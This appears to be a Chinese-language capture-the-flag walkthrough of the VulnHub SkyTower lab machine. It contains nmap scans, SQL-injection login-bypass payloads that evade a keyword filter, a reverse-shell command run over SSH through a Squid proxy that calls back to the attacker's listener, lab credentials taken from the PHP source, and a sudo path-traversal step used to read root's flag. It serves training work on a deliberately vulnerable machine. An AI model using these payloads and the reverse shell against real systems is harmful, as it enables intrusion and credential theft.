## port scan

```shell
# Nmap 7.94SVN scan initiated Tue Nov 12 05:07:23 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up (0.0010s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
MAC Address: 08:00:27:9A:C9:AA (Oracle VirtualBox virtual NIC)
```

22端口被过滤状态

```shell
# Nmap 7.94SVN scan initiated Tue Nov 12 05:11:06 2024 as: nmap -sT -sV -sC -O -p22,80,3128 -oN nmap_results/detils_scan 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up (0.0019s latency).

PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Debian)
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.20
MAC Address: 08:00:27:9A:C9:AA (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16
Network Distance: 1 hop
```

vuln scan

```shell
# Nmap 7.94SVN scan initiated Tue Nov 12 05:10:14 2024 as: nmap --script=vuln -p22,80,3128 -oN nmap_results/vuln_scan 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up (0.00078s latency).

PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.101
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://192.168.56.101:80/
|     Form id:
|_    Form action: login.php
| http-sql-injection:
|   Possible sqli for forms:
|     Form at path: /, form's action: login.php. Fields that might be vulnerable:
|_      email
| http-enum:
|_  /login.php: Possible admin folder
3128/tcp open     squid-http
MAC Address: 08:00:27:9A:C9:AA (Oracle VirtualBox virtual NIC)
```

## web

一个登录框

whatweb识别，不是cms，应该是自己写的

测试发现，登录参数`email`存在sql注入，并且有过滤

```
email=' or 1=1--+&password=' or 12=1--+
```

![image-20241113170751097](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113170751097.png)

等号被过滤了，用`like`

```
email=' and '1' like '1%23&password=' and '1' like '1%23
```

利用这种方式将引号闭合，成功登录

![image-20241113171838209](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113171838209.png)

拿到凭据`john:hereisjohn`

## SSH

因为22端口是过滤的，但是有3128端口，一个代理服务，尝试使用3128端口代理登录

```bash
vim /etc/proxychains4.conf
```

写入

> http 192.168.56.101 3128

![image-20241113172510303](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113172510303.png)

登录上去了，但是又掉了

> Funds have been withdrawn:`资金已被撤回`

提示我们，被撤回了

`ssh`命令连接时，可以执行一条命令

```
ssh [user@]hostname 'command'
```

```bash
┌──(root㉿kali)-[~/vulnhub/SkyTower]
└─# proxychains ssh john@192.168.56.101 'whoami;id'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.56.101:3128  ...  192.168.56.101:22  ...  OK
john@192.168.56.101's password:
john
uid=1000(john) gid=1000(john) groups=1000(john)
```

成功执行，尝试反弹shell

```shell
proxychains ssh john@192.168.56.101 "sh -i >& /dev/tcp/192.168.56.128/1234 0>&1"
```

```shell
rlwrap nc -lvnp 1234
```

![image-20241113172959845](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113172959845.png)

```shell
cat .bashrc
```

![image-20241113173355069](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113173355069.png)

怪不得登不上去，原来是直接退出了

```bash
mv .bashrc .bashrc.bak
```

将它删除，或者改文件名

```shell
proxychains ssh john@192.168.56.101
```

成功登录

常规提权没有利用点

查看`passwd`文件，发现用户

```
sara:x:1001:1001:,,,:/home/sara:/bin/bash
william:x:1002:1002:,,,:/home/william:/bin/bash
```

去web目录数据库账号密码，`login.php`找到账户密码

```php
<?php
$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

if($db->connect_errno > 0){
    die('Unable to connect to database [' . $db->connect_error . ']');

}
$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
$email = str_ireplace($sqlinjection, "", $_POST['email']);
$password = str_ireplace($sqlinjection, "", $_POST['password']);

$sql= "SELECT * FROM login where email='".$email."' and password='".$password."';";
$result = $db->query($sql);
```

`root:root`

![image-20241113174926345](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241113174926345.png)

```
john    hereisjohn
sara  ihatethisjob
william  senseable
```

我登录`sara`用户

```bash
john@SkyTower:/var/www$ su sara
Password:

Funds have been withdrawn
```

还是和之前一样

## sudo 提权

```shell
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

有`cat`，`ls`命令，限制了文件夹，但是可以用`../`穿越目录

```shell
sara@SkyTower:~$ sudo ls /accounts/../root/
flag.txt
sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```

拿到root密码：`theskytower`